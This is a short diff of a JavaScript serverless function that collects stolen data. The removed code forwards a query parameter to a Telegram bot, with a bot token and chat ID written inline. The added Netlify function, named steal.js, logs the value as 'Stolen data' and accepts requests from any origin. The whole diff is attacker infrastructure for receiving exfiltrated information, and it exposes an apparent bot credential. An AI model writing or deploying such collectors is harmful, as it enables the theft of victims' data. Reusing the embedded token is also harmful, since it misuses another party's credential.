@@ -1,6 +1,13 @@
-const fetch = require('node-fetch');
-module.exports = async (req, res) => {
-  const data = req.query.data;
-  await fetch('https://api.telegram.org/8187328608:AAEILvWGBaxv-_TMOLPiQpqA8EyphwXNjq0/sendMessage?chat_id=7535811931&text=' + data);
-  res.sendStatus(200);
+// functions/steal.js
+exports.handler = async (event) => {
+  const data = event.queryStringParameters.data;
+  
+  // Логирование в консоль Netlify
+  console.log('Stolen data:', data);
+  
+  return {
+    statusCode: 200,
+    body: JSON.stringify({ received: true }),
+    headers: { 'Access-Control-Allow-Origin': '*' }
+  };
 };
